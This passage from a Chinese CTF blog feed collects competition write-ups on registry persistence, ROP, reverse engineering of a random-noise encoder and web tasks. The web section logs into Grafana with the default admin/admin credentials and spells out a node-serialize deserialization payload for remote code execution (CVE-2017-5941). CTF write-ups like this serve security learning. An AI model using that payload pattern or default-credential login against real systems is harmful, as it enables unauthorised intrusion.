[Aha!]</strong></h3><p>本题目是关于Windows下通过注册表持久化的题目，比赛时因为对注册表没有过多了解就跳过了。现在拿到Writeup之后转过头来研究一下。</p><p><strong>什么是注册表？</strong></p><p>注册表是Windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着Windows的启动、硬件驱动程序的装载以及一些Windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。</p><p><strong>注册表中的键根</strong></p><ul><li>HKEY_CLASSES_ROOT：启动应用程序所需的全部信息，如扩展名，应用程序与文档之间的关系，驱动程序名，DDE和OLE信息，类ID编号和应用程序与文档的图标等。</li><li>HKEY_CURRENT_USER：当前登录用户的配置信息，如环境变量，个人程序以及桌面设置等。</li><li>HKEY_LOCAL_MACHINE：本地计算机的系统信息，如硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息。</li><li>HKEY_USERS：计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问。</li><li>HKEY_CURRENT_CONFIG：当前硬件的配置信息，其中的信息是从HKEY_LOCAL_MACHINE中映射出来的。</li></ul><p>题目给出了HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE中的信息，并且给出HKLM中的HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager信息存储到单独的Manager.txt中作为线索。</p><p>在Manager.txt我们可以发现一个被base64编码的png图片，如下所示。估计是暗示我们这是一个ribbit hole(新大陆)，flag应该以base64的方式存储在注册表中与持久化相关的键中。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153123.png" alt="4-4-1"></p><p>最终flag以base64编码的形式分成三段藏在以下三个值里。拼接后即可得到一段Python代码，运行后即可拿到flag。</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_USERS\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKEY_USERS\SOFTWARE\Microsoft\Windows\CurrentVersion\Screensavers\ssText3d\Screen 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153144.png" alt="4-4-2"></p><h2 id="5-OSINT"><a href="#5-OSINT" class="headerlink" title="5 OSINT"></a>5 OSINT</h2><p><a href="https://medium.com/@drv1us/ascwg-2022-ctf-qualifications-osint-challenges-writeup-cb21f270eb66">https://medium.com/@drv1us/ascwg-2022-ctf-qualifications-osint-challenges-writeup-cb21f270eb66</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文为Arab Security Cyber Wargames 2022比赛的WriteUp。作为阿拉伯国家的CTF比赛，发现中东地区的网络安全氛围也是非常好，交流中可以学习到很多。最终我们在737支参赛队伍排名第67位。&lt;/p&gt;
&lt;p&gt;Sometimes you win, sometimes you learn.&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="比赛" scheme="https://laobameishijia.github.io/tag/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>CTF-PWN-1</title>
    <link href="https://laobameishijia.github.io/2022/08/04/ctf-pwn-1/"/>
    <id>https://laobameishijia.github.io/2022/08/04/ctf-pwn-1/</id>
    <published>2022-08-04T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="先检查保护机制"><a href="#先检查保护机制" class="headerlink" title="先检查保护机制"></a>先检查保护机制</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220522095648.png" alt="保护机制"></p><p>开启了Nx和Relro保护，stack还是可以溢出，但是在stack中写shellcode的方式已经不可以了。因为Nx把数据所在的区域全部标记为不可执行的了。</p><h2 id="查看反编译之后的代码"><a href="#查看反编译之后的代码" class="headerlink" title="查看反编译之后的代码"></a>查看反编译之后的代码</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220608101306.png" alt="反汇编"></p><p>观察到溢出点，<code>gets(v4 ,argv)</code>同时也可以看到程序中引入了system的系统调用，和相应的”/bin/sh”的字符串，所以我们可以通过ROP的方式解题。</p><p>ROP，Return-oriented programming面向返回导向式编程，会借助ret和栈顶，实现控制流的导向。</p><h2 id="关键问题"><a href="#关键问题" class="headerlink" title="关键问题"></a>关键问题</h2><p>system函数需要一个参数 <code>/bin/sh</code>，不能直接让system函数的地址覆盖掉 <code>返回地址</code>。需要利用ROP，将 <code>/bin/sh</code>的地址导入到 <code>rdi</code>寄存器里面，再调用system函数才行。</p><p>这个思路在第一开始，我是明白的。但是我不知道如何将 <code>/bin/sh</code>的地址保存到rdi寄存器里面去。还有就是，不知道这个system的地址到底应该是哪个？是extern里面的，还是plt里面的，亦或是 <code>_system</code>这个函数的？</p><h2 id="PLT原理"><a href="#PLT原理" class="headerlink" title="PLT原理"></a>PLT原理</h2><p>原理的部分，还是要补上。主要就是CSAPP的第七章。慢慢补上就好啦~~</p><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220715161804.png" alt="ROP"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;先检查保护机制&quot;&gt;&lt;a href=&quot;#先检查保护机制&quot; class=&quot;headerlink&quot; title=&quot;先检查保护机制</summary>
      
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="PWN" scheme="https://laobameishijia.github.io/tag/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for 0CTF2022</title>
    <link href="https://laobameishijia.github.io/2022/08/04/writeup-0ctf-2022/"/>
    <id>https://laobameishijia.github.io/2022/08/04/writeup-0ctf-2022/</id>
    <published>2022-08-04T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="Baby-Encoder—-未完成"><a href="#Baby-Encoder—-未完成" class="headerlink" title="Baby Encoder—-未完成"></a>Baby Encoder—-未完成</h2><h3 id="自己"><a href="#自己" class="headerlink" title="自己"></a>自己</h3><h4 id="主逻辑"><a href="#主逻辑" class="headerlink" title="主逻辑"></a>主逻辑</h4><ol><li>利用 <code>\dev\urandom</code>随机生成了 <code>0x40</code> 的随机数字，并且对这些随机数字进行了线性变化。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220918153242.png" alt="1"></li><li>基于buf中八个字节，进行一系列运算，产生 <code>128</code>个double类型的数据到 <code>int_64 v6[1024]</code>中去。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220918153539.png" alt="2部分函数"></li><li>打印输出 <code>v6</code>中的内容，并且从标准输入中读取 <code>64个字节</code>，与 <code>buf前64个字节</code>进行对比，如果相同则输出flag。</li></ol><h4 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h4><p>通过观察发现 <code>\dev\urandom</code>每一次产生的随机数都是不一样的，所以我们只能是根据程序回显出来的v6中的内容反推buf。</p><p>在执行想法的过程中遇到了阻碍，在主逻辑的第二步中，参与运算的部分数据同样来源于 <code>\dev\urandom</code>。这样我就没办法通过 <code>v6的内容</code>根据运算过程推算出参与运算的 <code>int_64 buf[j]--8个字节的内容</code>。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v24 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v25 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v26 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v27 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v28 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v29 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v30 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v31 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">/</span> <span class="token number">64.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v32 <span class="token operator">=</span> result<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">127</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  v11 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v24<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a2<span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span>          <span class="token punctuation">(</span><span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">*</span> <span class="token number">0.00000390625</span>        <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i        <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v25<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a3      <span class="token operator">+</span> v11<span class="token punctuation">;</span>  v13 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">3.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v26<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a4      <span class="token operator">+</span> v12<span class="token punctuation">;</span>  v14 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">4.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v27<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a5      <span class="token operator">+</span> v13<span class="token punctuation">;</span>  v15 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">5.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v28<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a6      <span class="token operator">+</span> v14<span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">6.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v29<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a7      <span class="token operator">+</span> v15<span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">7.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v30<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a8      <span class="token operator">+</span> v16<span class="token punctuation">;</span>  v18 <span class="token operator">=</span> <span class="token function">cos</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.141592653589793</span> <span class="token operator">+</span> <span class="token number">3.141592653589793</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2000.0</span> <span class="token operator">*</span> <span class="token number">8.0</span> <span class="token operator">*</span> <span class="token number">0.00000390625</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v31<span class="token punctuation">)</span>      <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>a9      <span class="token operator">+</span> v17<span class="token punctuation">;</span>  v10 <span class="token operator">=</span> v18 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_55C6B1D5C365</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">8LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>v32 <span class="token operator">+</span> v10<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我有猜测，是否在 <code>cos参与的运算</code>中可以把相关的随机因素给消除掉。观察了很长时间，也没发现其中蕴含的数学法则可以把随机的因素给消除掉。</p><h3 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h3><p>居然涉及到数学的傅里叶级数，这真的是完全没有想到的。</p><p>大体思路就是通过傅里叶级数的不同形式，忽略掉随机的部分，只求振幅。振幅就是<code>buf[j]</code>。咱是实在没耐心看着一堆数学公式。</p><p><a href="https://hackmd.io/@vishiswoz/rkSNRg8Zo#">writeup</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220920151256.png" alt="writeup图片"></p><h2 id="vintage-part1—未完成"><a href="#vintage-part1—未完成" class="headerlink" title="vintage - part1—未完成"></a>vintage - part1—未完成</h2><h3 id="自己-1"><a href="#自己-1" class="headerlink" title="自己"></a>自己</h3><p>用linux下的file工具分析了一下，显示其是 <code>Vectrex ROM image</code>。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220918161455.png" alt="Vectrex ROM"></p><p>我找了很长时间的模拟器，想要找一个模拟器模拟运行这个镜像文件。找了半天，找到了一个在线版本的。把这个二进制文件直接拖进去就可以运行。</p><p><a href="https://drsnuggles.github.io/jsvecx/">https://drsnuggles.github.io/jsvecx/</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220918173202.png" alt="运行结果"></p><p>泥马8位密码，大写字母+数字+符号。呜呜呜，然后我试着在二进制文件中找了一下字符串，如果游戏密码是明文存放的话，应该是可以找到的。</p><p>结果就是没找着。。。。</p><p>我又想着根据这个game的文件格式—通过对比网上的这种游戏发现它们都是 <code>.vec结尾的</code>去逆推源码。在网上搜了半天也没发现相关。真是无语~~~</p><p>:&gt; :&gt; :&gt; :&gt;</p><p>最终找到了一个vectrexy工具链接如下，倒是可以调试了，但是这里面代码啥的看不懂呢！</p><p><a href="https://github.com/amaiorano/vectrexy">https://github.com/amaiorano/vectrexy</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220919100935.png" alt="vectrexy"></p><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>😔😔😔😔</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Rev&quot;&gt;&lt;a href=&quot;#Rev&quot; class=&quot;headerlink&quot; title=&quot;Rev&quot;&gt;&lt;/a&gt;Rev&lt;/h1&gt;&lt;h2 id=&quot;Baby-Encoder—-未完成&quot;&gt;&lt;a href=&quot;#Baby-Encoder—-未完成&quot; class=&quot;header</summary>
      
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="比赛" scheme="https://laobameishijia.github.io/tag/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Deloitte Hacky Holiday</title>
    <link href="https://laobameishijia.github.io/2022/08/04/deloitte-hacky-holiday-2022-writeup/"/>
    <id>https://laobameishijia.github.io/2022/08/04/deloitte-hacky-holiday-2022-writeup/</id>
    <published>2022-08-04T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.676Z</updated>
    
    <content type="html"><![CDATA[<p>简介：</p><p>本文Deloitte Hacky Holiday比赛的WriteUp，主办方的题目非常有质量而且梯度拉开非常友好。我们最终在2334只参赛队伍中取得了75名次的成绩，再接再厉！</p><span id="more"></span><p>我们是SCU_HXD: NING0121, meishijia, jackfromeast</p><p>最终的名次：75th / 2334 participated teams</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="Teaser-su-admin"><a href="#Teaser-su-admin" class="headerlink" title="Teaser su admin"></a><strong>Teaser su admin</strong></h3><p>这是一道关于 web 页面的题目，共一关为新手村等级。</p><p>这道题关键在于考察 “F12” 开发者模式的使用。首先题目提供了一张图片，为一个盾牌的设计图，要求我们生成同样的盾牌符号，经过尝试，我们只能生成相同配色，但不包含图案的盾牌如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1.png" alt="1-1"></p><p>因此我们使用开发者模式检查元素后发现，在选择配色和花纹时，存在隐藏（hidden）选项，我们只需要将隐藏选项通过修改标签的 Class 值进行开启，就可以实现相同盾牌图形。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-3.png" alt="1-3"></p><p>生成后，便展示出了 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;4DM1N_4PPR0V3D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-GRAPHING-IT-OUT"><a href="#2-5-GRAPHING-IT-OUT" class="headerlink" title="2-5 GRAPHING IT OUT"></a><strong>2-5 GRAPHING IT OUT</strong></h3><p>第一关，要寻找到一个dashboard，根据题目中的描述需要找到网页中被隐藏的入口。打开网页的源码发现，其中存在被注释掉的a标签，根据路由找到了Grafana系统的入口。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/DK-ylZ2Y4MeQzX_WsfrpwA.png" alt="1"></p><p>由于这个系统在之前的课程设计中曾经使用过，初始设置的账号密码均为 admin，经过尝试之后顺利进入到表盘系统中。然后在不同的表盘 General/Sample 中发现了 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;c3deaca3fb4fec9f4900e82b9ee830c6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关，题目描述要寻找数据，因为之前在课程设计中 grafana 和 influxDB 两个是结合起来使用的。所以就在 grafana 中查看表盘数据的来源，果然使用的是 influxDB。那么根据经验需要查询数据库中是否有想要的数据。influxDB 中的数据是以 bucket 存在的，在数据库的查询页面中，输入 buckets() ,查询之后，发现有 _monitoring_tasks\data\flag, 四个 bucket，然后就是查询flag中的数据</p><pre class="line-numbers language-none"><code class="language-none">from(bucket:&quot;flag&quot;)    |&gt; range(start:0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查询到flag为</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;493c709cff326b344f94acfb6f6cfd81&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关 <strong>Uncompleted</strong></p><h3 id="3-2-HACKY-HOLIDAYS-AIRLINES"><a href="#3-2-HACKY-HOLIDAYS-AIRLINES" class="headerlink" title="3-2 HACKY HOLIDAYS AIRLINES"></a><strong>3-2 HACKY HOLIDAYS AIRLINES</strong></h3><p>此题给出了网站的源码，通过简单的审计，猜测这是一道关于反序列漏洞的题目。如下所示，用户所传递的Cookie在没有经过其他过滤的情况下直接被反序列化，因此可能由此完成RCE。查看其完成反序列化操作的包为’node-serialize’并且版本为0.0.4，搜索后发现果然该版本的node-serialize存在反序列化漏洞CVE-2017-5941。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(1).png" alt="2"></p><p>此漏洞的代码存在于<code>node_modules/node-serialize/lib/serialize.js</code>中。我们可以看到，当反序列化对象的值为<code>string</code>并且以<code>FUNCFLAG(i.e. _$$ND_FUNC$$_)</code>开头时，则会调用eval函数。也就是说，如果我们传入的字符串例如:<code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(&#39;xxx&#39;)&#125;&quot;&#125;</code>，则该语句在截取字符串后就变成了<code>eval(function()&#123;console.log(&#39;xxx&#39;)&#125;)</code>。接着，我们还需要该函数在定义后立即执行，所以在其最后加上括号表示使用IIFE立即调用执行，即可完成RCE。所以构造的目标字符串应该形如：<code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(&#39;xxx&#39;)&#125;()&quot;&#125;</code>.</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/qrbi_kEOvPYhh77r_LwZ1Q.jpeg" 